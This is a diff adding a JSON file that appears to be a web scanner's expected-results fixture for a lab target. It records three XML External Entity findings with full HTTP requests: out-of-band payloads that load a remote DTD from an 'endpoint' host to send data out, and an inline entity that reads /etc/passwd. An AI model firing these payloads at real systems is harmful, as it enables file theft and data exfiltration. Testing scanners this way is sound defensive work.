@@ -1,0 +1,374 @@
+{
+    "vulnerabilities": {
+        "XML External Entity": [
+            {
+                "method": "POST",
+                "path": "/xml_vuln_maker.php",
+                "info": "The target reached the DTD file on the endpoint but the exploitation didn't succeed.",
+                "parameter": "raw body",
+                "module": "xxe",
+                "http_request": "POST /xml_vuln_maker.php HTTP/1.1\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY % remote SYSTEM \"http://endpoint/dtd/pz8b22/5/72617720626f6479/linux2.dtd\">\n%remote; %intern; %trick; ]>\n<xml><test>hello</test></xml>",
+                "wstg": [
+                    "WSTG-INPV-07"
+                ]
+            },
+            {
+                "method": "POST",
+                "path": "/xml_vuln_maker.php",
+                "info": "Out-Of-Band XXE vulnerability by sending raw XML in request body\nThe target sent 922 bytes of data to the endpoint at 2023-07-19T12:38:35+00:00 with IP 192.168.112.22.\nReceived data can be seen at http://endpoint/xxe_data/pz8b22/5/72617720626f6479/1689770315-1-192.168.112.22.txt.",
+                "parameter": "raw body",
+                "module": "xxe",
+                "http_request": "POST /xml_vuln_maker.php HTTP/1.1\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY % remote SYSTEM \"http://endpoint/dtd/pz8b22/5/72617720626f6479/linux.dtd\">\n%remote; %intern; %trick; ]>\n<xml><test>hello</test></xml>",
+                "wstg": [
+                    "WSTG-INPV-07"
+                ]
+            },
+            {
+                "method": "POST",
+                "path": "/xml_vuln_maker.php",
+                "info": "XXE vulnerability leading to file disclosure",
+                "parameter": "raw body",
+                "module": "xxe",
+                "http_request": "POST /xml_vuln_maker.php?filterword=passwd HTTP/1.1\nhost: xxe\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncontent-type: text/xml\ncontent-length: 134\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+                "wstg": [
+                    "WSTG-INPV-07"
+                ]
+            }
+        ]
+    },
+    "infos": {
+        "target": "http://xxe/",
+        "crawled_pages": [
+            {
+                "request": {
+                    "url": "http://xxe/",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "xxe"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<!DOCTYPE html>\n<html>\n<head>\n\t<title>Index</title>\n</head>\n<body>\n\t<h1>Index</h1>\n\t<p>This is a simple PHP web page.</p>\n    <ul>\n        <li><a href=\"./xml_vuln_maker.php?filterword=passwd\">link 1</a></li>\n        <li><a href=\"./xml_vuln_maker.php?filterword=networks\">link 2</a></li>\n        <li><a href=\"./xml_vuln_maker.php?filterword=linux\">link 3</a></li>\n    </ul>\n</body>\n</html>\n",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "211"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            },
+            {
+                "request": {
+                    "url": "http://xxe/xml_vuln_maker.php",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "xxe"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<!DOCTYPE html><html><head>    <title>XML Receiver</title></head><body>    <h1>XML Receiver</h1>    <a>This page accept XML as POST requests and will mirror it to you<a></body></html>",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "151"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            },
+            {
+                "request": {
+                    "url": "http://xxe/xml_vuln_maker.php",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "xxe"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<!DOCTYPE html><html><head>    <title>XML Receiver</title></head><body>    <h1>XML Receiver</h1>    <a>This page accept XML as POST requests and will mirror it to you<a></body></html>",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "151"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            },
+            {
+                "request": {
+                    "url": "http://xxe/xml_vuln_maker.php",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "xxe"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<!DOCTYPE html><html><head>    <title>XML Receiver</title></head><body>    <h1>XML Receiver</h1>    <a>This page accept XML as POST requests and will mirror it to you<a></body></html>",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "151"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            },
+            {
+                "request": {
+                    "url": "http://xxe/xml_vuln_maker.php",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "xxe"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<!DOCTYPE html><html><head>    <title>XML Receiver</title></head><body>    <h1>XML Receiver</h1>    <a>This page accept XML as POST requests and will mirror it to you<a></body></html>",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "151"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            }
+        ]
+    }
+}
